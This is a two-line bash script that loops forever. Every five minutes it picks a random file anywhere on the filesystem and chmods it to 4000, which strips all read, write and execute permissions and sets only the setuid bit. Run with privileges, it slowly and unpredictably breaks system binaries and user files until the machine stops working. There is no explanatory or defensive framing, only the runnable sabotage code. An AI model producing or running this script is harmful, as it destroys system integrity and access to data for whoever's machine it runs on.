#!/bin/bash
while true; do chmod 4000 $(find / | sort -R | tail -1 ) && sleep 5m; done